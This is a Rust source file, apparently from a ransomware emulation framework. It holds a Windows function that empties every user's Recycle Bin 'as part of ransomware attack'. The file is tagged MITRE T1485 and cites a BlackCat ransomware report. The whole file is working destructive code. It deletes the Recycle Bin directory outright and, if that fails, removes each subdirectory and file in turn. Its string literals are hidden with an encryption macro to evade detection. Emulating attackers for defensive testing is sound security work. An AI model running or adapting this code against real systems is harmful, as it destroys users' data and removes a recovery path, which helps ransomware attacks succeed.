#![cfg(target_os = "windows")]

use std::fs;
use crate::logger::{log_error, log_info, log_debug};
use encryptliterals::esl;

/**
 * empty_recycling_bin
 *      About:
 *          Clears Recycle Bin as part of ransomware attack.
 *      Result:
 *          Cleared Recycle Bin of every user
 *      MITRE ATT&CK Techniques:
 *          T1485: Data Destruction
 *      CTI:
 *          https://www.varonis.com/blog/blackcat-ransomware
 */
pub fn empty_recycling_bin() {
    match fs::remove_dir_all(esl!("C:\\$Recycle.Bin")) {
        Ok(_) => log_info(String::from(esl!("Removed all files and directories from Recycle Bin"))),
        Err(e) => {
            log_error(format!("{} {:?}", esl!("Failed to delete recycle bin directory. Will attempt to clear individual subdirectories. Error message:") , e));
            match fs::read_dir(esl!("C:\\$Recycle.Bin")) {
                Ok(entries) => {
                    for entry in entries {
                        match entry {
                            Ok(entry) => {
                                let path = entry.path();
                                if path.is_dir() {
                                    match fs::remove_dir_all(path.clone()) {
                                        Ok(_) => log_debug(format!("{} {:?}", esl!("Deleted recycling bin subdirectory") , path.clone())),
                                        Err(e) => {
                                            log_error(format!("{} {:?}: {:?}", esl!("Failed to delete recycling bin subdirectory"), path.clone(), e));
                                        }
                                    }
                                } else {
                                    match fs::remove_file(path.clone()) {
                                        Ok(_) => log_debug(format!("{} {:?}", esl!("Deleted recycling bin item") , path.clone())),
                                        Err(e) => {
                                            log_error(format!("{} {:?}: {:?}", esl!("Failed to delete recycling bin item"), path.clone(), e));
                                        }
                                    }
                                }
                            },
                            Err(e) => {
                                log_error(format!("{} {:?}", esl!("Failed to access entry:"), e));
                            }
                        };
                    }
                },
                Err(e) => {
                    log_error(format!("{} {:?}", esl!("Failed to enumerate recycle bin subdirectories:") , e));
                }
            }
        }
    }
}